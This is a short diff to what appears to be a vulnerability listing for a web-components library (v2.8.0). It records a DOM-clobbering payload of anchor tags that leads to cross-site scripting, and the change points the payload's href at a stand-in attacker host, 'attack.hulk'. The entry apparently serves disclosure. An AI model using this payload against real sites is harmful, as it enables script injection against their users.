@@ -6,7 +6,7 @@
 + Stars: 1.1K
 + Version: v2.8.0
 + Fingerprint: `window.WebComponents !== 'undefined'`
-+ Payload: ```<a id="ShadyDOM"></a><a id="ShadyDOM" name="force"></a><a id="WebComponents"></a><a id="WebComponents" name="root" href="https://xxx.xxx.xxx"></a>```
++ Payload: ```<a id="ShadyDOM"></a><a id="ShadyDOM" name="force"></a><a id="WebComponents"></a><a id="WebComponents" name="root" href="https://attack.hulk"></a>```
 + Impact: XSS
 + Status: Reported
 + CVE: N/A
